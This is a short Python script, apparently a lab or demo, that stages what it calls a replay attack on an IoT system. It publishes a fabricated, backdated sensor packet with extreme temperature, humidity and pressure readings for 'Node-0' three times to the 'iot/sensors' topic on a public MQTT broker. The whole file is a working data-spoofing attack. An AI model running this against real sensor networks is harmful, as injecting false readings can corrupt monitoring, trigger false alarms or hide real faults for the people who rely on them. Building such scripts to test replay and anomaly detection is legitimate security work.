import json
import time
import paho.mqtt.publish as publish

replay_data = {
    "Temperature": 85.0,
    "Humidity": 3.0,
    "Pressure": 600.0,
    "node_id": "Node-0",
    "timestamp": time.time() - 500
}

print("🚨 Starting Replay Attack...")
for i in range(3):
    publish.single("iot/sensors", json.dumps(replay_data), hostname="broker.hivemq.com")
    print(f"[{i+1}] Replayed packet:", replay_data)
    time.sleep(2)